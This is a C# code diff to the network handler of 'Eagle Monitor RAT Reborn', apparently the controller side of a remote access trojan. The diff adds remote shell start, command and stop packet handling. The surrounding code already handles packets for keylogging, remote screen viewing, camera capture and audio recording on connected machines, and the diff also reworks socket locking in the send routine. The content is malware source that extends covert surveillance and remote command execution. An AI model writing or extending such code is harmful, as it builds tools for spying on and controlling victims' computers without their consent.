@@ -121,7 +121,6 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                 Receive();
         }
 
-
         private IPacket PacketParser(byte[] BufferPacket)
         {
             IPacket packet = BufferPacket.DeserializePacket(Program.settings.key);
@@ -178,7 +177,19 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                         ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler.clientHandler.HWID = packet.HWID;
                         new PacketHandler(packet, this);
                         break;
-   
+
+                    case PacketType.SHELL_START:
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
+
+                    case PacketType.SHELL_COMMAND:
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
+
                     default:
                         new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
                         this.Dispose();
@@ -187,11 +198,10 @@ namespace Eagle_Monitor_RAT_Reborn.Network
             }
         }
 
-
         internal void SendPacket(IPacket packet)
         {
             packet.HWID = this.HWID;
-            if(packet.packetType != PacketType.RM_VIEW_OFF && packet.packetType != PacketType.RC_CAPTURE_OFF && packet.packetType != PacketType.AUDIO_RECORD_OFF && packet.packetType != PacketType.KEYLOG_OFF && packet.packetType != PacketType.CHAT_OFF)
+            if(packet.packetType != PacketType.RM_VIEW_OFF && packet.packetType != PacketType.RC_CAPTURE_OFF && packet.packetType != PacketType.AUDIO_RECORD_OFF && packet.packetType != PacketType.KEYLOG_OFF && packet.packetType != PacketType.CHAT_OFF && packet.packetType != PacketType.SHELL_STOP)
                 packet.baseIp = this.IP;
 
             if (socket != null)
@@ -216,12 +226,11 @@ namespace Eagle_Monitor_RAT_Reborn.Network
             header[3] = temp[3];
             header[4] = (byte)data.packetType;
 
-            try
+            lock (socket)
             {
-                lock (socket)
+                try
                 {
                     socket.Poll(-1, SelectMode.SelectWrite);
-
                     int sent = socket.Send(header);
 
                     if (size > 1000000)
@@ -247,15 +256,16 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                         }
                     }
                     data.packetState = PacketState.SENT;
+
                 }
-            }
-            catch (Exception ex)
-            {
-                data.packetState = PacketState.NOT_SENT;
-                data.status = ex.Message;
-                SocketException sockError = ex as SocketException;
-                if (sockError != null)
-                    this.Dispose();
+                catch (Exception ex)
+                {
+                    data.packetState = PacketState.NOT_SENT;
+                    data.status = ex.Message;
+                    SocketException sockError = ex as SocketException;
+                    if (sockError != null)
+                        this.Dispose();
+                }
             }
             return data;
         }
@@ -345,12 +355,19 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     }
                     break;
 
-
                 case PacketType.CHAT_OFF:
                     lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler)
                     {
                         ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler.Dispose();
                         ClientHandler.ClientHandlersList[packet.baseIp].clientForm.chatHandler = null;
+                    }
+                    break;
+
+                case PacketType.SHELL_STOP:
+                    lock (ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler)
+                    {
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler.Dispose();
+                        ClientHandler.ClientHandlersList[packet.baseIp].clientForm.remoteShellHandler = null;
                     }
                     break;
 
@@ -373,6 +390,12 @@ namespace Eagle_Monitor_RAT_Reborn.Network
                     break;
 
                 case PacketType.RM_VIEW_ON:
+                    break;
+
+                case PacketType.SHELL_START:
+                    break;
+
+                case PacketType.SHELL_COMMAND:
                     break;
 
                 default:
